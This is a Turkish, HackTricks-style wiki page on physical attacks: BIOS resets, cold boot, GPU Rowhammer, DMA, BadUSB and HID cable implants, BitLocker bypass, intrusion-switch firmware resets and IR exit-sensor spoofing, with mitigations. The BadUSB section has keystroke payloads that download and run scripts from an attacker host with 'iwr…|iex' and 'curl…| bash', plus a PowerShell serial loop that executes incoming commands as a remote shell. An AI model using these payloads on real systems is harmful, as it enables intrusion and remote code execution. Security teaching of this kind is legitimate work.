# Fiziksel Saldırılar

{{#include ../banners/hacktricks-training.md}}

Kart düzeyinde arayüz keşfi, seri konsollar, flash erişimi, yan kanal saldırıları ve glitching için [Hardware Hacking](hardware-hacking/README.md) ve arayüze özel bölümlerine bakın. Bu sayfada, sisteme bir bütün olarak fiziksel erişim gerektiren saldırılar ele alınmaktadır.

## BIOS Parola Kurtarma ve Sistem Güvenliği

Eski PC firmware ayarları, CMOS pilinin bağlantısını keserek veya belgelenmiş bir CMOS sıfırlama jumper'ı kullanarak sıfırlanabilir. Gerekli kapalı kalma süresi anakarta göre değişir. Modern UEFI parolaları veya anahtarları kalıcı flash bellekte, gömülü bir denetleyicide ya da bir güvenlik aygıtında saklanabilir ve bu nedenle pil çıkarıldığında silinmeyebilir. Pinleri kısa devre etmeden önce anakart/servis kılavuzuna başvurun; bu işlem TPM ölçümlerini de geçersiz kılabilir ve disk şifreleme kurtarma sürecini tetikleyebilir.

Eski x86 sistemlerde **killCMOS** ve **CmosPwd** gibi araçlar, önyüklenebilir bir ortamdan CMOS destekli ayarları inceleyebilir veya değiştirebilir. CmosPwd, belgelenmiş eski BIOS ailelerinden parola biçimlerini tanır ve CMOS durumunu yedekleyebilir, geri yükleyebilir veya silebilir/sonlandırabilir; yayımlanmış sürümleri eski DOS/Windows, Linux, FreeBSD ve NetBSD ortamlarını hedefler.<sup>[[18]](#references)</sup> Bu araçlar genel amaçlı UEFI parola kaldırıcıları değildir ve yeterli donanım/firmware erişimi gerektirir.

Bazı dizüstü bilgisayar firmware'leri, birkaç başarısız parola denemesinden sonra üreticiye özgü bir sorgulama kodu görüntüler. [bios-pw.org](https://bios-pw.org) gibi veritabanları, bazı modeller için eski üretici kurtarma parolalarını türetebilir; ancak birçok sistem, türetilebilir bir sorgulama kodu olmadan kilitlenme uygular. Oluşturulan parolaların modele özgü olduğunu unutmayın ve kalıcı deneme sayaçlarını tüketmekten kaçının.

### UEFI Güvenliği

Modern **UEFI** sistemlerde CHIPSEC, Secure Boot değişkeni korumalarını denetleyebilir. Aşağıdaki değişiklik yapmayan denetimle başlayın; isteğe bağlı `-a modify` modu, değişkenleri bozmayı bilerek dener ve yalnızca kurtarılabilir bir laboratuvar sisteminde kullanılmalıdır. CHIPSEC, ayrıcalıklı sürücüsünün ve düşük düzey donanım erişiminin üretim uç noktalarında kullanıma uygun olmadığı konusunda da uyarır.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM Analizi ve Cold Boot Saldırıları

DRAM, yenileme durduğunda tüm bitleri hemen kaybetmez. Veri kaybı hızı modül teknolojisine ve sıcaklığa göre önemli ölçüde değişir; soğutma, yararlı verileri soğutulmamış bir güç döngüsünden çok daha uzun süre koruyabilir. Cold-boot saldırısında, bellek hızla küçük bir edinim ortamına yeniden başlatılır veya soğutulmuş bir modül aktarılır; ardından ham bellek yakalanır ve bit kaybına rağmen kriptografik anahtarlar yeniden oluşturulur. Disk kopyalama aracı, otomatik olarak fiziksel bellek görüntüleme aracı değildir; Volatility ise yakalama işlemi yapmaz, alınmış bir görüntüyü analiz eder. Platforma uygun, doğrulanmış bir edinim aracı kullanın.<sup>[[12]](#references)</sup>

---

## Sayfa Tablolarını Hedefleyen GPU Rowhammer

Modern GPU Rowhammer saldırıları, sıradan arabellekler yerine **GPU sanal bellek meta verilerini** hedeflediğinde çok daha etkili hâle gelir. **GDDR6 NVIDIA Ampere GPU'lar** üzerinde yapılan yakın tarihli çalışmalar, ayrıcalıksız CUDA kodu çalıştıran bir saldırganın GPU'ya özgü hammering kalıpları oluşturabildiğini, sayfalama yapılarını güvenlik açığı bulunan satırlara yerleştirmek için **memory massaging** kullanabildiğini ve ardından **son düzey sayfa tablosunda** ya da bir ara **sayfa dizininde** bit değiştirebildiğini gösteriyor. Tek bir çeviri girdisi bozulduğunda saldırgan, **GPU belleğinde rastgele okuma/yazma** olanağı elde edip buradan ana makineyi ele geçirmeye ilerleyebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### İstismar Modeli

1. GDDR6'da **hammering uygulanabilen satırların profilini çıkarın** ve DRAM içi önlemleri aşan, yenileme düzenini dikkate alan / eşit olmayan hammering kalıpları oluşturun.
2. Sürücünün sayfa çeviri yapılarını varsayılan korumalı havuzda tutmak yerine hammering uygulanabilen fiziksel konumlara yerleştirmesi için **GPU tahsislerini düzenleyin**. Uygulamada bu, düşük bellekli sayfa tablosu bölgesini tüketmek ve denetimli adımlarla büyük, seyrek UVM eşlemeleri oluşturmak anlamına gelebilir.
3. Saldırganın denetimindeki sanal sayfanın sayfa tablosu sayfalarına, rastgele GPU belleğine veya ana makinenin görebildiği sistem eşlemelerine çözülmesini sağlamak için sayfa tablosu / sayfa dizini girdisindeki **PFN** ya da aperture ile ilgili bitler gibi **çeviri meta verilerini değiştirin**.
4. Sahte eşlemeyi kullanarak ek çeviri girdilerini yeniden yazın ve GPU bağlamları arasında **GPU belleğinde rastgele okuma/yazma** olanağına yükseltin.

### Ana Makineye Geçiş ve Azaltımlar

- **IOMMU devre dışıysa**, sahte sistem-aperture eşlemeleri GPU'ya rastgele **ana makine fiziksel belleğine** erişim sağlayabilir; böylece GPU primitive'i ana makinenin tamamen ele geçirilmesine yol açar.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** son düzey sayfa tablosu girdilerini hedeflerken, **GeForge** bir sayfa dizini düzeyini bozmanın daha kolay olabileceğini gösteriyor; çünkü tek bir bit değişikliği daha geniş bir çeviri alt ağacını başka yere yönlendirebilir. Yalnızca tek bir sayfalama katmanını güvenlik açısından kritik kabul etmeyin.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**, GDDRHammer/GeForge'un kullandığı ana makine belleğine doğrudan rastgele erişim yolunu engellediği için önemlidir; ancak **eksiksiz bir azaltım değildir**. **GPUBreach**, saldırganın GPU tarafından yazılabilen, sürücüye ait CPU arabelleklerini bozduğu ve ardından NVIDIA sürücüsündeki bellek güvenliği hatalarını tetikleyerek IOMMU etkin olsa bile çekirdeğe yazma primitive'i ve **root shell** elde ettiği ikinci aşama bir geçiş gösteriyor.<sup>[[3]](#references)</sup>
- Desteklenen iş istasyonu/sunucu GPU'larında **sistem düzeyinde ECC** kullanmak pratik bir güçlendirme adımıdır. ECC'siz tüketici GPU'ları daha zayıf bir savunma yüzeyi sunar.<sup>[[4]](#references)</sup>
- Bu saldırılar salt teorik değildir: **GeForge**, RTX 3060 üzerinde **1.171**, RTX A6000 üzerinde ise **202** bit değişikliği bildirdi; bunlar çalışan bir ana makine ayrıcalık yükseltme zinciri oluşturmak için yeterliydi.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Doğrudan Bellek Erişimi (DMA) Saldırıları

Önyükleme öncesi IOMMU zorlamasını düşürerek Windows DMA zincirini mümkün kılabilen çevrimdışı UEFI IFR/NVRAM yama işlemleri için bkz.:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**, FireWire ve ilk dönem Thunderbolt yapılandırmaları gibi arabirimler üzerinden **DMA tabanlı bellek edinimini ve yamalamayı** gösterir; buna geçmişte kullanılan oturum açma atlatma imzaları da dahildir. Bu saldırı Windows 10'a karşı basitçe “etkisiz” değildir: istismar edilebilirlik arabirime, hedef derlemeye, IOMMU ilkesine, kilit durumuna ve Windows Kernel DMA Protection'ın desteklenip etkinleştirilmiş olmasına bağlıdır. Windows 10 sürüm 1803 ve sonrası, uyumlu platformlarda Kernel DMA Protection'ı kullanıma sunarak saldırı yüzeyini önemli ölçüde değiştirdi.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Sisteme Erişim için Live CD/USB

Şifrelenmemiş veya kilidi zaten açılmış bir Windows biriminde, çevrimdışı bir ortam **sethc.exe** ya da **Utilman.exe** gibi erişilebilirlik ikililerini **cmd.exe** ile değiştirebilir. Böylece ilgili oturum açma ekranı kısayolu çalıştırıldığında SYSTEM komut istemi elde edilir. **chntpw** gibi araçlar yerel SAM hesap verilerini düzenleyebilir. Bu yöntemler kilitli bir BitLocker biriminin kilidini açmaz ve DPAPI/EFS ile korunan kimlik bilgilerine zarar verebilir; adli kopyaları ve yedekleri saklayın.

**Kon-Boot**, desteklenen Windows/macOS yapılandırmaları için ticari bir önyükleme zamanı kimlik doğrulama atlatma aracıdır. Uyumluluk işletim sistemine, firmware moduna, Secure Boot'a ve disk şifreleme yapılandırmasına bağlıdır; BitLocker ile kilitlenmiş bir birimin şifresini çözmez.<sup>[[10]](#references)</sup>

---

## Windows Güvenlik Özelliklerini Ele Alma

### Önyükleme ve Kurtarma Kısayolları

- **Delete/Supr**, F2, F10 veya üreticiye özgü başka bir tuş firmware kurulumunu açabilir.
- **F8**, yalnızca bu yolun etkin kaldığı yapılandırmalarda eski Windows gelişmiş önyükleme seçeneklerini açar; mevcut kurtarma giriş yöntemi değişiklik gösterir.
- **Shift** tuşunu basılı tutmak bazı yapılandırmalarda Windows'un otomatik oturum açmasını engelleyebilir; ancak ilke/kayıt defteri ayarları bu davranışı devre dışı bırakabilir.<sup>[[17]](#references)</sup>

### BAD USB Aygıtları

**USB Rubber Ducky** ve Teensy kartları gibi aygıtlar güvenilir HID klavyeler olarak tanınabilir ve önceden tanımlanmış tuş vuruşlarını enjekte edebilir. Yük başlangıçta oturum açmış kullanıcının oturum ayrıcalıklarına ve masaüstü erişimine sahiptir; UAC istemleri, ekran kilidi, klavye düzeni, zamanlama ve uç nokta USB ilkesi yine de kısıtlayıcıdır.<sup>[[15]](#references)</sup>

Programlanabilir çevre birimleri, ana makinenin çekirdek ayrıştırıcılarına da saldırabilir ve heap grooming ile bilgi ifşası için birden fazla USB aygıtını eşgüdümlü biçimde kullanabilir:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Yönetici veya yedekleme ayrıcalıkları, kilitli **SAM** ve **SYSTEM** gibi dosyaların edinilebilmesi için shadow copy oluşturmayı ya da kayıt defteri hive'larını kaydetmeyi sağlar. Bu, ayrıcalık atlatma değil, sistem ele geçirildikten sonra kullanılan bir toplama tekniğidir; `diskshadow`/VSS ve kayıt defteri hive dışa aktarma olaylarıyla ilişkilendirilmelidir.

## BadUSB / HID Implant Teknikleri

### NFC ile Tetiklenen Android HID Gadget

Root erişimli bir Android telefon, yalnızca USB denetleyicisi ve çekirdeği **USB gadget/HID desteği** sağlıyorsa programlanabilir USB klavyesine dönüşebilir. Uyumlu cihazlarda Kali NetHunter, **USB Arsenal** üzerinden gadget profilleri sunar. Diğer bir seçenek olan [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), ConfigFS gadget işlevleri oluşturur ve `/dev/hidg0` ile `/dev/hidg1` gibi klavye/fare karakter aygıtlarını kullanıma açabilir. Araç yalnızca gadget uç noktasını oluşturur; HID raporlarını bu uç noktaya yazmak için ayrı bir işlem gerekir. Root erişimi, ConfigFS, HID gadget desteği veya kullanılabilir bir USB Device Controller bulunmayan bir çekirdeği telafi edemez.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Bu uç nokta, fiziksel bir tetikleyici olarak Android NFC ile birleştirilebilir. [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) uygulaması bir etiket UID'sini okur, bunu beklenen gösterime dönüştürür, yerel bir izin listesinde denetler ve eşleşme olduğunda yapılandırılmış, Rubber Ducky tarzı bir klavye dizisi gönderir. Bağlı ana makine sıradan klavye girdisi görür ve NFC yazılımına ihtiyaç duymaz.<sup>[[22]](#references)[[24]](#references)</sup>

Kısayolları veya komutları kullanmadan önce aygıtın tanınmasını ve klavye düzenini boş bir metin düzenleyicisinde doğrulayın. Zararsız bir yük örneği:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Önemli güven sınırları:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Bir **UID whitelist'i kimlik belirlemedir, kimlik doğrulama değil**. UID'ler herkese açıktır ve bazı token türleri ya da emülatörler kopyalamaya veya kimliğe bürünmeye izin verir. Kopyalanan bir izinli UID, özgün token ile aynı yönlendirme yolunu izler.
- **NfcScreenOff** Magisk modülü, NFC hizmetine yama uygulayarak ekran açık ve kilidi kaldırılmış gibi davranmasını sağlar. Telefon zaten bir host'a bağlıysa bu, telefonun kilidini açmadan birinin payload'ı tetiklemesine olanak tanıyabilir.
- Payload'da depolanan parolalar, API token'ları ve komutlar; root erişimi olan veya bootloader kilidi açılmış bir cihazda kurtarılabilir sır niteliğindedir. HID üzerinden parola yazmak, parolasız kimlik doğrulama değil, yeniden kullanılabilir parola otomasyonudur.
- HID enjeksiyonu, etkin masaüstünün ayrıcalıklarıyla çalışır ve odak, zamanlama ve host'un klavye düzenine bağlıdır. Hassas eylemleri göndermeden önce kullanıcının yakın zamanda onay vermesini zorunlu kılın, betiklerde ayrıcalıklı sırlar bulundurmaktan kaçının ve gerçek kimlik doğrulaması için kriptografik challenge-response kimlik doğrulayıcı kullanın.

### Wi-Fi yönetimli kablo implantları

- **Evil Crow Cable Wind** gibi ESP32-S3 tabanlı implantlar USB-A→USB-C veya USB-C↔USB-C kablolarının içine gizlenir, yalnızca USB klavyesi olarak tanınır ve C2 altyapısını Wi-Fi üzerinden sunar. Operatörün tek yapması gereken kabloya kurban host üzerinden güç vermek, `Evil Crow Cable Wind` adlı ve `123456789` parolalı bir hotspot oluşturmak ve gömülü HTTP arayüzüne erişmek için [http://cable-wind.local/](http://cable-wind.local/) adresine (veya DHCP adresine) gitmektir.<sup>[[8]](#references)</sup>
- Tarayıcı arayüzünde *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* sekmeleri bulunur. Depolanan payload'lar işletim sistemine göre etiketlenir, klavye düzenleri anında değiştirilir ve VID/PID dizeleri bilinen çevre birimlerini taklit edecek şekilde değiştirilebilir.
- C2 kablonun içinde olduğundan, bir telefon kuruluşun ağını kullanmadan payload'ları hazırlayabilir, çalıştırmayı tetikleyebilir ve Wi-Fi kimlik bilgilerini yönetebilir; bu, fiziksel erişimle kısa süreli izinsiz girişler için kullanışlıdır.

### OS-aware AutoExec payload'ları

- AutoExec kuralları, USB tanınmasının hemen ardından çalıştırılmak üzere bir veya daha fazla payload'ı ilişkilendirir. İmplant, hafif bir işletim sistemi parmak izi belirleme işlemi yapar ve uygun betiği seçer.
- Örnek iş akışı:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Çalıştırma gözetimsiz gerçekleştiğinden, şarj kablosunu değiştirmek oturum açmış kullanıcının bağlamında “plug-and-pwn” ilk erişimini sağlayabilir.

### Wi-Fi TCP üzerinden HID ile başlatılan uzak kabuk

1. **Tuş vuruşlarıyla başlatma:** Depolanmış bir payload konsolu açar ve yeni USB seri aygıtına gelen her şeyi çalıştıran bir döngü yapıştırır. Basit bir Windows çeşidi şöyledir:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant, ESP32-S3'ü operatöre geri bağlanan bir TCP client (Python script, Android APK veya masaüstü executable) başlatırken USB CDC kanalını açık tutar. TCP oturumuna yazılan tüm byte'lar yukarıdaki serial döngüsüne aktarılır ve böylece air-gapped host'larda bile remote command execution sağlanır. Çıktı sınırlıdır, bu nedenle operatörler genellikle komutları körlemesine çalıştırır (hesap oluşturma, ek araçları hazırlama vb.).

### HTTP OTA update yüzeyi

- Belgelenen Evil Crow Cable Wind arayüzü, `/update` adresinde kimlik doğrulaması gerektirmeyen bir firmware-update endpoint'i sunar:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Saha operatörleri, kabloyu açmadan etkileşim sırasında özellikleri değiştirebilir (ör. flash USB Army Knife firmware'ini yükleyebilir); böylece implant hedef ana bilgisayara bağlı kalırken yeni yeteneklere geçebilir.

## BitLocker Şifrelemesini Atlama

Canlı veya yakın zamanda çalışmış bir sistemden yetkili adli inceleme amacıyla alınan verilerde, bir BitLocker birimi kilidi açılmış durumdayken birim ana anahtarı veya ilişkili anahtar malzemesi bulunabilir. Elcomsoft Forensic Disk Decryptor ve Passware Kit Forensic gibi ticari araçlar, desteklenen bellek imajlarını, hazırda bekletme dosyalarını veya çökme dökümlerini tarayabilir; ancak başarılı sonuç garanti değildir. Modern Windows, BitLocker etkin olduğunda çökme dökümlerini de şifreler ve kayıtlı 48 haneli kurtarma parolası, bellekteki birim anahtarından farklı bir veridir.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Kurtarma Anahtarı Ekleme İçin Sosyal Mühendislik

Saldırgan, bir yöneticiyi BitLocker yönetim komutlarını çalıştırmaya ikna ederek bir kurtarma parolası, harici anahtar veya başka bir koruyucu ekleyip bunu ele geçirebilir. Kurtarma parolası, rastgele sıfırlardan oluşan bir dize olamaz: BitLocker sayısal kurtarma parolaları, doğrulanan 48 haneli bir biçime sahiptir. İlgili yetkili yönetim sözdizimi şöyledir: `manage-bde -protectors -add C: -recoverypassword`; eklenen koruyucuları `manage-bde -protectors -get C:` komutuyla listeleyin. Koruyucu eklemelerini izleyin ve yeni kurtarma malzemesinin yalnızca onaylı konumlarda yedeklendiğinden emin olun.<sup>[[16]](#references)</sup>

---

## BIOS'u Fabrika Ayarlarına Döndürmek İçin Kasa Açılma / Bakım Anahtarlarından Yararlanma

Birçok modern dizüstü bilgisayar ve küçük form faktörlü masaüstü bilgisayarda, Embedded Controller (EC) ve BIOS/UEFI firmware tarafından izlenen bir **kasa açılma anahtarı** bulunur. Anahtarın birincil amacı cihaz açıldığında uyarı vermek olsa da üreticiler bazen anahtar belirli bir düzende değiştirildiğinde tetiklenen **belgelenmemiş bir kurtarma kısayolu** uygular.<sup>[[5]](#references)[[6]](#references)</sup>

### Saldırı Nasıl Çalışır

1. Anahtar, EC üzerindeki bir **GPIO kesmesine** bağlanır.
2. EC üzerinde çalışan firmware, **basışların zamanlamasını ve sayısını** takip eder.
3. Sabit kodlanmış bir düzen algılandığında EC, **sistem NVRAM/CMOS içeriğini silen** bir *mainboard-reset* yordamını çağırır.
4. Sonraki açılışta etkilenen modeller, sıfırlanmış firmware durumunu yükler. Üreticiye ve sürüme bağlı olarak silinen durum; yönetici parolasını, özel açılış ayarlarını veya kayıtlı Secure Boot anahtarlarını içerebilir. TPM durumu ve disk şifrelemesine etkileri ayrıca değerlendirilmelidir.

> Firmware sıfırlaması harici aygıttan açılış seçeneklerini geri yükleyebilir, ancak depolama aygıtının şifresini **çözmez**. BitLocker veya başka bir tam disk şifreleme sistemi, TPM/firmware değişikliklerinden sonra kurtarma moduna geçebilir ve kurtarma anahtarı olmadan da dahili sürücüyü korumaya devam edebilir.<sup>[[16]](#references)</sup>

### Gerçek Dünya Örneği – Framework 13 Dizüstü Bilgisayar

Framework 13 (11./12./13. nesil) için kurtarma kısayolu şöyledir:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Onuncu döngüden sonra EC, sonraki yeniden başlatmada BIOS'a NVRAM'i silmesini bildiren bir bayrak ayarlar. Tüm işlem yaklaşık 40 saniye sürer ve **yalnızca bir tornavida** gerektirir.<sup>[[5]](#references)</sup>

### Genel Exploitation Prosedürü

1. EC'nin çalıştığından emin olmak için hedefi açın veya uyku durumundan uyandırın.
2. İzinsiz giriş/bakım anahtarını açığa çıkarmak için alt kapağı çıkarın.
3. Üreticiye özgü geçiş düzenini uygulayın (belgelere veya forumlara başvurun ya da EC firmware'ini tersine mühendislikle analiz edin).
4. Cihazı yeniden birleştirip yeniden başlatın; ardından hangi firmware ayarlarının ve kimlik bilgilerinin gerçekten değiştiğini inceleyin.
5. Yetkiniz varsa ve harici önyükleme kullanılabiliyorsa, denetimli bir canlı imajla önyükleme yapın. Dahili bir birim meşru şekilde kilidi açıldıktan sonra (veya hiç şifrelenmemişse), canlı ortam kimlik bilgilerini ve verileri elde edebilir ya da EFI System Partition'ı inceleyebilir. Bu bölümü değiştirerek bir EFI implant'ı yüklemek kalıcı ve son derece müdahalecidir; ayrıca Secure Boot, measured boot, firmware yazma koruması ve endpoint izleme ile kısıtlanır. Şifreli depolama, anahtarı veya kurtarma materyali olmadan erişilemez durumda kalır.

### Tespit ve Azaltma

* Kasa izinsiz giriş olaylarını OS yönetim konsolunda kaydedin ve beklenmedik BIOS sıfırlamalarıyla ilişkilendirin.
* Açılma durumunu tespit etmek için vidalarda/kapaklarda **müdahale edildiğini belli eden mühürler** kullanın.
* Cihazları **fiziksel olarak denetlenen alanlarda** tutun; fiziksel erişimin tam ihlal anlamına geldiğini varsayın.
* Varsa üreticinin “bakım anahtarıyla sıfırlama” özelliğini devre dışı bırakın veya NVRAM sıfırlamaları için ek bir kriptografik yetkilendirme isteyin.

---

## Dokunmadan Çıkış Sensörlerine Karşı Gizli IR Injection

### Sensör Özellikleri
- Piyasadaki “el sallayarak çıkış” sensörleri, modüle edilmiş bir IR sinyalini doğruladıktan sonra çıkış veren bir alıcıyla yakın kızılötesi LED vericiyi eşleştirir.<sup>[[7]](#references)</sup>
- Plastik bir muhafaza, verici ile alıcının birbirini doğrudan görmesini engeller. Böylece kontrolcü, doğrulanmış sinyalin yakındaki bir yüzeyden yansıdığını varsayar ve kapı karşılığını açan röleyi çalıştırır.
- Kontrolcü bir hedef algıladığını düşündüğünde gönderilen sinyalin biçimini çoğu zaman değiştirir; ancak alıcı, filtrelenmiş sinyalle eşleşen sinyalleri kabul etmeyi sürdürür.

### Attack Workflow
1. **Sinyal profilini kaydedin** – Sensörün algılama öncesi ve sonrası davranışını inceleyerek olası zayıflıkları belirleyin.
2. **Algılama sonrası sinyali taklit edin** – Sensörün doğrulama mantığını yanıltan bir IR sinyali kullanılması, röle çıkışının etkinleşmesine yol açabilir.
3. **Sinyal iletimini ayarlayın** – Sürekli veya uygunsuz sinyal gönderimi sensörün hassasiyetini azaltabileceğinden, iletim davranışını dikkatle değerlendirin.

### Uzun Menzilli Yansıtmalı Injection
- Daha güçlü bir IR kaynağı ve odaklayıcı optik bileşenler, sensörün tetiklenmesini uzaktan mümkün kılabilir.
- Alıcıyla doğrudan görüş hattı gerekmeyebilir; camın ardından görülebilen duvarlar, raflar veya kapı kasaları gibi yüzeylerden yansıyan enerji algılama alanına girebilir.
- Sensörler genellikle zayıf yansımalar beklediğinden, daha güçlü bir dış sinyal birden çok yüzeyden yansıdıktan sonra da algılama eşiğini aşabilir.

### Saldırı Aracına Dönüştürülmüş El Feneri
- IR kaynağını sıradan bir el feneri içine gizlemek, aracı fark edilmeden taşımayı kolaylaştırabilir.
- Farklı sensör ailelerinin sinyal doğrulama davranışları değişebildiğinden, uyumluluk sağlamak için çeşitli sinyal biçimleri denenebilir.
- Görünür ışık yaymadan geri bildirim sağlamak, iletimin etkin olup olmadığını anlamayı kolaylaştırabilir.

---

## References

- [1] [GDDRHammer: DRAM Satırlarını Büyük Ölçüde Bozma — Modern GPU'lardan Kaynaklanan Bileşenler Arası Rowhammer Saldırıları](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Eğlence ve Kazanç İçin GPU Sayfa Tabloları Oluşturmak Amacıyla GDDR Belleğe Hammer Uygulama](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer Kullanarak GPU'larda Ayrıcalık Yükseltme Saldırıları](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Güvenlik Bildirimi: Rowhammer - Temmuz 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Buraya basıp pwn edin”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Anakart Sıfırlama Kılavuzu](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Hayır, dokunmayın! – Gizli bir IR el feneriyle IR dokunmadan çıkış sensörlerini atlatma”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Tak, çalıştır, pwn et: Evil Crow Cable Wind ile hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Yongalarına Karşı Rowhammer Saldırısı](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot resmi belgeleri ve uyumluluk bilgileri](https://kon-boot.com/)
- [11] [CHIPSEC belgeleri - Secure Boot değişken korumaları](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Unutmamak Gerekirse: Şifreleme Anahtarlarına Karşı Cold Boot Saldırıları](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA üzerinden fiziksel bellek manipülasyonu](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Koruması](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky belgeleri](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker işlemleri kılavuzu](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift tuşunu basılı tutma ve otomatik oturum açma davranışı](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd belgeleri ve indirmeleri](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Belgeleri - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel belgeleri - USB HID gadget sürücüsü](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Root'lu bir Android telefonu bilgisayarınız için NFC kimlik doğrulayıcısına ve otomasyon aracına dönüştürme](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
